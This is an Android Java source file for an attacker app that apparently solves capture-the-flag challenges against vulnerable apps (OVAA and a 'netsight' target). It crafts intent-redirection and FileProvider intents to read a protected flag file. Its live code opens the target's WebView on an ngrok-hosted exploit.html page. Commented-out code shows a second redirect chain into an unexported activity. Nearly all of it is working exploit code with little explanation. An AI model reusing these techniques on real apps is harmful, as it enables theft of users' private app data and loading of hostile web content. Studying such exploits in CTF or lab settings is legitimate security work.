package com.evil.evilintentaccessprotectedovaa;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.util.Objects;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

//        //first intent will be prepared and targeted to protected un-exported
//        //activity called WebActivity. But since we'll load 2 args of intent
//        //that are the package name and the class, we'll create a context
//        //and a class loader first
//        Context icontext = null;
//        try {
//            icontext = createPackageContext("oversecured.ovaa",Context.CONTEXT_INCLUDE_CODE|Context.CONTEXT_IGNORE_SECURITY);
//        } catch (PackageManager.NameNotFoundException e) {
//            e.printStackTrace();
//        }
//
//        Class iclass = null;
//        try {
//            iclass = icontext.getClassLoader().loadClass("oversecured.ovaa.activities.WebViewActivity");
//        } catch (ClassNotFoundException e) {
//            e.printStackTrace();
//        }

        //This is scenario for ovaa
//        //Intended solver 1-> declare component and the class manually
//        //Intent redirectintent = new Intent(icontext,iclass);
//
//        //intended solver 2
//        Intent redirectintent = new Intent();
//
//        //this is solver 1, but it's not required for solver 2
//        redirectintent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.WebViewActivity");
//        redirectintent.putExtra("url", "https://petircysec.com/");
//
//        Intent loginintent = new Intent("oversecured.ovaa.action.LOGIN");
//        loginintent.setClassName("oversecured.ovaa","oversecured.ovaa.activities.LoginActivity");
//        loginintent.putExtra("redirect_intent",redirectintent);
//        startActivity(loginintent);



        // This is scenario for tcp1p

        Intent i = new Intent();
        i.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
        i.setClassName(getPackageName(), "com.evil.evilintentaccessprotectedovaa.LeakActivity");
//        i.setClassName("com.tcpip.netsight","com.tcpip.netsight.PickerActivity");
        i.setData(Uri.parse("content://com.tcpip.netsight.FileProvider/data/data/com.tcpip.netsight/files/flaggo.txt"));
        Log.d("YOUKNOWWHAT",i.toUri(Intent.URI_INTENT_SCHEME));

        Intent baboi = new Intent();
        baboi.setClassName("com.tcpip.netsight","com.tcpip.netsight.WebviewActivity");
        baboi.putExtra("url","https://bc0c-180-252-163-125.ngrok-free.app/exploit.html");
        startActivity(baboi);

//        Intent baboi = new Intent();
//        baboi.setClassName("com.tcpip.netsight","com.tcpip.netsight.PickerActivity");
//        baboi.setData(Uri.parse("content://com.tcpip.netsight.FileProvider/root/data/data/com.tcpip.netsight/files/flaggo.txt"));
//        startActivity(baboi);

    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        try {
            Log.d("OHNOOOOOOOOOOO", Objects.requireNonNull(getContentResolver().openInputStream(Objects.requireNonNull(data.getData()))).toString());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}